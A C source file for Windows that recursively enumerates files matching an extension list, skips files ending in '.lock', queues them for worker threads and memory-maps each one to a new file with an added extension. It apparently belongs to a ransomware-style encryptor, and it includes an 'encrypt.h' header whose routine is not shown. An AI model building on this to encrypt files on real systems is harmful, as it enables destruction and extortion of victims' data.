#include <stdio.h>
#include <windows.h>
#include "file_utils.h"
#include "stack.h"
#include "sync.h"
#include "encrypt.h"

#define UNICODE
#define _UNICODE

static inline int is_valid_file(const wchar_t *file) {
    const wchar_t *valid_extensions[] = VALID_EXTENSIONS;
    size_t num_extensions = sizeof(valid_extensions) / sizeof(valid_extensions[0]);

    if (wcsstr(file, L".lock") != NULL) {
        return 0;
    }

    for (size_t i = 0; i < num_extensions; i++) {
        if (wcsstr(file, valid_extensions[i]) != NULL) {
            return 1;
        }
    }

    return 0; 
}

bool should_ignore(const WIN32_FIND_DATAW *find_file_data) {
    if((wcscmp((wchar_t*)find_file_data->cFileName, L".") == 0) || (wcscmp((wchar_t*)find_file_data->cFileName, L"..") == 0))
        return 1;
    if(find_file_data->dwFileAttributes & IGNORE_ATTRIBUTES)
        return 1;
    return 0;
}

bool build_path(wchar_t *folder_path, const size_t size, const wchar_t *root_path, const wchar_t *file_name) {
    if(_snwprintf(folder_path, size, L"%s\\%s", root_path, file_name) < 0)
        return 0;
    return 1;
}

void add_to_stack(WIN32_FIND_DATAW *file_data, wchar_t *path, struct Stack *folders_stack, struct Stack *files_stack) {
    if (file_data == NULL || path == NULL || folders_stack == NULL || files_stack == NULL) {
        return;
    }
    if (file_data->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        stack_push(folders_stack, path);
    } else if (is_valid_file((wchar_t*)file_data->cFileName)) {
        stack_push(files_stack, path);
        release_sem();
    }
}

wchar_t *duplicate_path(const wchar_t *path) {
    wchar_t *duplicated_path = wcsdup(path);
    if (duplicated_path == NULL) {
        fwprintf(stderr, L"Error: failed to allocate memory for path '%ls'\n", path);
    }
    return duplicated_path;
}

void populate_stacks_from_directory(wchar_t *root_path, struct Stack *folders_stack, struct Stack *files_stack) {
    wchar_t search_path[MAX_PATH], folder_path[MAX_PATH];
    wchar_t *duplicated_path;
    
    WIN32_FIND_DATAW find_file_data;
    HANDLE hfind;
    
    _snwprintf(search_path, MAX_PATH, L"%s\\*", root_path);

    hfind = FindFirstFileW(search_path, &find_file_data);
    if (hfind == INVALID_HANDLE_VALUE) {
        printf("Error: unable to open folder... (%ls: %ls)\n", root_path, search_path);
        return;
    }

    do {
        if(should_ignore(&find_file_data)) continue;

        // Build path
        if(!build_path(folder_path, MAX_PATH, root_path, find_file_data.cFileName)) continue;

        // Duplicate path
        duplicated_path = duplicate_path(folder_path);
        if (!duplicated_path) {
            continue;
        }

        // Add to stack
        add_to_stack(&find_file_data, duplicated_path, folders_stack, files_stack);
    } while (FindNextFileW(hfind, &find_file_data) != 0);

    FindClose(hfind);
}

void create_file_mappings(const wchar_t *file_path, DWORD *file_size, LPVOID *p_src, LPVOID *p_dst) {
    HANDLE h_file = NULL, h_map = NULL, h_dest_file = NULL, h_dest_map = NULL;
    wchar_t *output_file = NULL;

    if (file_path == NULL || file_size == NULL || p_src == NULL || p_dst == NULL) {
        wprintf(L"Erreur : Paramètres invalides.\n");
        return;
    }

    wchar_t *file_path_duplicated = wcsdup(file_path);

    output_file = add_extension(file_path_duplicated);
    if (output_file == NULL) {
        wprintf(L"Erreur : Impossible d'ajouter une extension au fichier.\n");
        return;
    }

    free(file_path_duplicated);

    h_file = CreateFileW(file_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_file == INVALID_HANDLE_VALUE) {
        wprintf(L"Erreur : Impossible d'ouvrir le fichier source.\n");
        free(output_file);
        return;
    }

    *file_size = GetFileSize(h_file, NULL);
    if (*file_size == INVALID_FILE_SIZE) {
        wprintf(L"Erreur : Impossible d'obtenir la taille du fichier.\n");
        CloseHandle(h_file);
        free(output_file);
        return;
    }

    h_map = CreateFileMappingW(h_file, NULL, PAGE_READONLY, 0, 0, NULL);
    if (h_map == NULL) {
        wprintf(L"Erreur : Impossible de créer un mapping de fichier pour le fichier source.\n");
        CloseHandle(h_file);
        free(output_file);
        return;
    }

    *p_src = MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0);
    if (*p_src == NULL) {
        wprintf(L"Erreur : Impossible de mapper la vue du fichier source.\n");
        CloseHandle(h_map);
        CloseHandle(h_file);
        free(output_file);
        return;
    }

    h_dest_file = CreateFileW(output_file, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_dest_file == INVALID_HANDLE_VALUE) {
        wprintf(L"Erreur : Impossible de créer le fichier de destination.\n");
        UnmapViewOfFile(*p_src);
        CloseHandle(h_map);
        CloseHandle(h_file);
        free(output_file);
        return;
    }

    h_dest_map = CreateFileMappingW(h_dest_file, NULL, PAGE_READWRITE, 0, *file_size, NULL);
    if (h_dest_map == NULL) {
        wprintf(L"Erreur : Impossible de créer un mapping de fichier pour le fichier de destination.\n");
        UnmapViewOfFile(*p_src);
        CloseHandle(h_dest_file);
        CloseHandle(h_map);
        CloseHandle(h_file);
        free(output_file);
        return;
    }

    *p_dst = MapViewOfFile(h_dest_map, FILE_MAP_WRITE, 0, 0, *file_size);
    if (*p_dst == NULL) {
        wprintf(L"Erreur : Impossible de mapper la vue du fichier de destination.\n");
        CloseHandle(h_dest_map);
        CloseHandle(h_dest_file);
        UnmapViewOfFile(*p_src);
        CloseHandle(h_map);
        CloseHandle(h_file);
        free(output_file);
        return;
    }

    free(output_file);

    CloseHandle(h_map);
    CloseHandle(h_file);
    CloseHandle(h_dest_map);
    CloseHandle(h_dest_file);

    wprintf(L"Les mappings de fichiers ont été créés avec succès.\n");
}

